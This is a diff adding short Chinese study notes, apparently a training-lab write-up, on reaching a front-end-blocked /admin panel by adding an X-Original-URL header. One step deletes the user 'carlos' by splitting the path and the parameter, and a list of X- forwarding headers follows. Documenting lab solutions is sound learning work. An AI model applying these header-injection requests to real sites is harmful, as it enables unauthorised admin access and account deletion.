@@ -1,0 +1,26 @@
+先整一下感受昂:
+HTTP里面出现空行就意味着结束,不能直接空行,但要保留空行
+get /admdin  -> 前端拦截
+
+
+其一:
+先是在最后面加上: get/ (前端校验通过) X-Original-URL: /admin(这是后端采用的实践路径)
+接收到到管理员的response
+这时候尝试:X-Original-URL: /admin/delete?username=carlos
+没用,这时候没有采用路径错位,防止一次性企图太明显而被拦截
+然后 get /?username=carlos(具体某个参数)  X-original-URL: /admin/delete(路径)
+solved
+
+其二:
+拦截请求: 最后一行回车加上: x-Original-URL: /admin
+放出去请求,进入控制面板.
+solved
+
+以前很多非标准、但是被产品广泛采用的扩展header,会以X-开头,如:
+X-Original-URL: /admin              传递原始请求路径
+X-Original-URI: /admin              传递原始URI
+X-Rewrite-URL: /admin               提示后端使用重写后的路径
+X-Forwarded-For: 203.0.113.10       传递客户端IP
+X-Forwarded-Host：                  传递原始访问域名
+X-Forwarded-Proto：https            传递原始协议
+Forwarded:                          上述转发信息的标准化header形式
